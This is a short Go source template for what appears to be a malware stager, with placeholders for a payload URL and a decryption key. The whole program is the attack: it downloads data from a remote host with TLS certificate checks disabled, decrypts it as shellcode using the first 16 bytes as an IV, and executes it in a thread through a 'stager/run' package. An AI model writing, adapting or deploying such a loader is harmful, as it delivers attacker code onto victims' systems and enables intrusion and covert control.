package main

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"

	"stager/run"
)

func main() {
	url := "{{ .Url }}"
	key := []byte("{{ .Key }}")

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}
	resp, err := client.Get(url)
	if err != nil {
		fmt.Println(err)
	}
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println(err)
	}

	sc := run.Decrypt(body[16:], key, body[:16])
	run.ThreadRun(sc)
}
